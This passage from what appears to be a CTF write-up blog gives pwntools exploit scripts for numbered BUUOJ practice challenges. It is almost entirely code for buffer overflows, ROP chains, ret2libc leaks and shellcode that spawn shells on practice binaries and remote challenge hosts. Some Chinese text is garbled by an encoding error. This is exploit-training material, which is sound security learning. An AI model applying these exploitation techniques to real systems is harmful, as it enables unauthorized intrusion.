<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;ciscn_2019_n_8&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26718)</span><br><span class="line">p.recv()</span><br><span class="line">payload &#x3D; &#39;\x11&#39;*53</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.08 pwn2 sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">#p &#x3D; remote()</span><br><span class="line">p &#x3D; process(&#39;.&#x2F;pwn2&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;pwn2&#39;)</span><br><span class="line"></span><br><span class="line">bss &#x3D; 0x0601060</span><br><span class="line">rdi &#x3D; 0x0000000000400693</span><br><span class="line">x &#x3D; 0x00400001</span><br><span class="line">ret &#x3D; 0x00000000004004ae</span><br><span class="line"></span><br><span class="line">payload &#x3D; p64(rdi) + p64(x)+ p64(x) + asm(shellcraft.sh()) </span><br><span class="line"></span><br><span class="line">#payload &#x3D;  asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(&#39;bss:\n&#39;)</span><br><span class="line">p.sendline(payload.ljust(112,&#39;a&#39;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 &#x3D; &#39;a&#39;*(0xa+8)  + p64(x)</span><br><span class="line">p.recvuntil(&#39;stack:\n&#39;)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.09 [OGeek2019]babyrop _sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;[OGeek2019]babyrop&#39;)</span><br><span class="line">	elf &#x3D; ELF(&#39;[OGeek2019]babyrop&#39;)</span><br><span class="line">	libc &#x3D; ELF(&#39;libc-2.23.so&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28661)</span><br><span class="line">	elf &#x3D; ELF(&#39;[OGeek2019]babyrop&#39;)</span><br><span class="line">	libc &#x3D; ELF(&#39;libc-2.23.so&#39;)</span><br><span class="line"></span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">main_addr &#x3D; 0x08048825</span><br><span class="line"></span><br><span class="line">payload1 &#x3D; &#39;\x00&#39;+ &#39;\xff&#39;*7</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(&#39;Correct\n&#39;)</span><br><span class="line"></span><br><span class="line">payload2 &#x3D; &#39;a&#39;* (0xe7+4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">write_addr &#x3D; u32(p.recv(4))</span><br><span class="line">offset &#x3D; write_addr - libc.sym[&#39;write&#39;]</span><br><span class="line">system_addr &#x3D; libc.sym[&#39;system&#39;] + offset</span><br><span class="line">binsh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next() + offset</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(&#39;Correct\n&#39;)</span><br><span class="line"></span><br><span class="line">payload3 &#x3D; &#39;a&#39;*(0xe7+4) + p32(system_addr) + &#39;aaaa&#39; + p32(binsh)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.10 ��������(��������)_2018_rop_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;i386&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29800)</span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;��������(��������)_2018_rop&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;��������(��������)_2018_rop&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">read_plt&#x3D;elf.plt[&#39;read&#39;]</span><br><span class="line">main_addr&#x3D;elf.symbols[&#39;main&#39;]</span><br><span class="line">bss_addr&#x3D;elf.symbols[&#39;__bss_start&#39;]</span><br><span class="line">def leak(address):</span><br><span class="line">        payload1&#x3D;&#39;a&#39;*(0x88+0x4)+p32(write_plt)+p32(main_addr)+p32(0x1)+p32(address)+p32(0x4)</span><br><span class="line">        p.sendline(payload1)</span><br><span class="line">        leak_address&#x3D;p.recv(4)</span><br><span class="line">        return leak_address</span><br><span class="line"></span><br><span class="line">d&#x3D;DynELF(leak,elf&#x3D;ELF(&#39;��������(��������)_2018_rop&#39;))</span><br><span class="line">sys_addr&#x3D;d.lookup(&#39;system&#39;,&#39;libc&#39;)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;a&#39;*(0x88+0x4)+p32(read_plt)+p32(main_addr)+p32(0x0)+p32(bss_addr)+p32(0x8)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line"></span><br><span class="line">payload3&#x3D;&#39;a&#39;*(0x88+0x4)+p32(sys_addr)+p32(main_addr)+p32(bss_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>#NO.11 bjdctf_2020_babyrop_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;bjdctf_2020_babyrop&#39;)</span><br><span class="line">	elf &#x3D; ELF(&#39;bjdctf_2020_babyrop&#39;)</span><br><span class="line">	#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26680)</span><br><span class="line">	elf &#x3D; ELF(&#39;bjdctf_2020_babyrop&#39;)</span><br><span class="line">	#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line">junk &#x3D; 32</span><br><span class="line">popr &#x3D; 0x0000000000400733</span><br><span class="line"></span><br><span class="line">puts_got &#x3D; elf.got[&quot;puts&quot;]</span><br><span class="line">puts_plt &#x3D; elf.symbols[&quot;puts&quot;]</span><br><span class="line">read_plt &#x3D; elf.got[&quot;read&quot;]</span><br><span class="line">read_got &#x3D; elf.symbols[&quot;read&quot;]</span><br><span class="line">main_addr &#x3D; 0x04006AD</span><br><span class="line">start_addr &#x3D; 0x400530</span><br><span class="line">payload &#x3D; junk*&#39;A&#39;+&#39;BBBBBBBB&#39;+p64(popr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class="line">p.recvuntil(&quot;Pull up your sword and tell me u story!\n&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr &#x3D; u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">log.info(&quot;puts_addr:&quot;+hex(puts_addr))</span><br><span class="line">libc &#x3D; LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line">offset &#x3D; puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="line">sys_addr &#x3D; offset+libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr &#x3D; offset+libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload &#x3D; junk*&#39;A&#39;+&#39;BBBBBBBB&#39;+p64(popr)+p64(binsh_addr)+p64(sys_addr)+p64(start_addr)</span><br><span class="line">p.recvuntil(&quot;Pull up your sword and tell me u story!\n&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.12 ciscn_2019_c_1_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28138)</span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;ciscn_2019_c_1&#39;)</span><br><span class="line">elf &#x3D; ELF(&#39;ciscn_2019_c_1&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.27.so&#39;)</span><br><span class="line"></span><br><span class="line">def send(pad):</span><br><span class="line">    print p.recvuntil(&#39;Input your choice!&#39;)</span><br><span class="line">    p.sendline(&#39;1&#39;)</span><br><span class="line">    print p.recvuntil(&#39;Input your Plaintext to be encrypted&#39;)</span><br><span class="line">    p.sendline(pad)</span><br><span class="line"></span><br><span class="line">padding &#x3D; 0x50+8</span><br><span class="line">pop_rdi_addr &#x3D; 0x400c83</span><br><span class="line">main_addr &#x3D; 0x0400B28</span><br><span class="line"></span><br><span class="line">__libc_start_main_got_addr &#x3D; elf.got[&#39;__libc_start_main&#39;]</span><br><span class="line">puts_plt_addr &#x3D; elf.plt[&#39;puts&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x50 + 8)</span><br><span class="line">payload +&#x3D; p64(pop_rdi_addr) </span><br><span class="line">payload +&#x3D; p64(__libc_start_main_got_addr) </span><br><span class="line">payload +&#x3D; p64(puts_plt_addr) </span><br><span class="line">payload +&#x3D; p64(main_addr)</span><br><span class="line"></span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">print p.recvline()    </span><br><span class="line">print p.recvline()   </span><br><span class="line">print p.recvline()</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">p.recvuntil(&#39;@\n&#39;)</span><br><span class="line">offest &#x3D; u64(p.recvline().strip().ljust(8,&#39;\x00&#39;)) - libc.sym[&#39;__libc_start_main&#39;]</span><br><span class="line"></span><br><span class="line">system_addr &#x3D; libc.sym[&#39;system&#39;] + offest</span><br><span class="line">bin_addr &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next() + offest</span><br><span class="line"></span><br><span class="line">ret &#x3D; 0x00000000004006b9</span><br><span class="line"></span><br><span class="line">payload1 &#x3D; &#39;a&#39;*padding+ p64(ret) + p64(pop_rdi_addr) + p64(bin_addr) + p64(system_addr) </span><br><span class="line">send(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.13 [BJDCTF 2nd]r2t3 _sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;[BJDCTF 2nd]r2t3&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29466)</span><br><span class="line"></span><br><span class="line">system_addr&#x3D;0x0804858B</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*8 + &#39;a&#39;*(0x9+0x4) + p32(system_addr) + &#39;a&#39;*(0x103-0x15-0x4) </span><br><span class="line"># �ƹ���Χ (3,8]��0x103 ~ 0x107 ʹ��p.sendline()�l�͕r����һ���Q�з�̖ ���� 0x103Ҳ�ɡ�</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;[+]Please input your name:\n&#39;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">print(hex(len(payload)))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.14 [BJDCTF 2nd]one_gadget _sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;[BJDCTF 2nd]one_gadget&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28292)</span><br><span class="line">elf &#x3D; ELF(&#39;[BJDCTF 2nd]one_gadget&#39;)</span><br><span class="line">libc &#x3D; ELF(&#39;libc-2.29.so&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget &#x3D; [0xe237f,0xe2383,0xe2386,0x106ef8]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:0x&quot;)</span><br><span class="line">printf_addr &#x3D; int(p.recvuntil(&#39;\n&#39;),16)</span><br><span class="line">p.recvuntil(&#39;:&#39;)</span><br><span class="line"></span><br><span class="line">offest &#x3D; printf_addr - libc.sym[&#39;printf&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; one_gadget[3] + offest</span><br><span class="line">p.sendline(str(payload))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.15 jarvisoj_level0_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; process(&#39;.&#x2F;jarvisoj_level0&#39;)</span><br><span class="line">#p &#x3D; remote(&#39;node3.buuoj.cn&#39;,27617)</span><br><span class="line">system_addr &#x3D; 0x400460</span><br><span class="line">binsh_addr &#x3D; 0x040059A</span><br><span class="line">sysfuntions_addr&#x3D; 0x00400596</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">#payload &#x3D; &#39;a&#39;*(0x80+8) + p64(sysfuntions_addr) # sovle1</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x80 +p64(system_addr) +p64(binsh_addr) # sovle2</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.16 [HarekazeCTF2019]baby_rop _sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;[HarekazeCTF2019]baby_rop&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,27724)</span><br><span class="line">elf &#x3D; ELF(&#39;[HarekazeCTF2019]baby_rop&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line">system_addr &#x3D; 0x00400490</span><br><span class="line">system_addr1 &#x3D; 0x04005E3</span><br><span class="line">sh_addr &#x3D; 0x0601048</span><br><span class="line"></span><br><span class="line">pop_rdi &#x3D; 0x0000000000400683</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x10+8) + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)</span><br><span class="line">#payload &#x3D; &#39;a&#39;*(0x10+8) + p64(pop_rdi) + p64(sh_addr)+ p64(system_addr1)</span><br><span class="line">p.recvuntil(&quot;What&#39;s your name? &quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.17 jarvisoj_level2 _sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 1</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;jarvisoj_level2&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,29779)</span><br><span class="line">#elf &#x3D; ELF(&#39;&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr &#x3D; 0x804845C</span><br><span class="line">system_addr1 &#x3D; 0x08048320</span><br><span class="line">binsh_addr &#x3D; 0x0804A024</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x88+4)+p32(system_addr)+p32(binsh_addr)</span><br><span class="line">#payload &#x3D; &#39;a&#39;*(0x88+4)+p32(system_addr1)+&#39;bbbb&#39;+p32(binsh_addr)</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>#NO.18 bjdctf_2020_babystack_sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;bjdctf_2020_babystack&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,26095)</span><br><span class="line">#elf &#x3D; ELF(&#39;bjdctf_2020_babystack&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#x2F;libc&#x2F;ubuntu16&#x2F;64&#x2F;libc-2.23.so&#39;)</span><br><span class="line"></span><br><span class="line">binsh_addr &#x3D; 0x0004006E6</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x10) +p64(0x123123)+ p64(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendafter(&#39;Please input the length of your name:\n&#39;,str(123123)+&#39;\n&#39;)</span><br><span class="line">p.sendafter(&quot;What&#39;s u name?\n&quot;,payload+&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>#NO.19 ciscn_2019_n_5 _sovle</p>
<p>###exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8-*-</span><br><span class="line">from pwn import *</span><br><span class="line">context(os&#x3D;&quot;linux&quot;, arch&#x3D;&quot;amd64&quot;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line">local &#x3D; 0</span><br><span class="line">if local:</span><br><span class="line">	p &#x3D; process(&#39;.&#x2F;ciscn_2019_n_5&#39;)</span><br><span class="line">else:</span><br><span class="line">	p &#x3D; remote(&#39;node3.buuoj.cn&#39;,27053)</span><br><span class="line">#elf &#x3D; ELF(&#39;&#39;)</span><br><span class="line">#libc &#x3D; ELF(&#39;&#39;)</span><br><span class="line"></span><br><span class="line">name_addr &#x3D; 0x00601080</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendafter(&#39;tell me your name&#39;,shellcode+&#39;\n&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x20+8) + p64(name_addr)</span><br><span 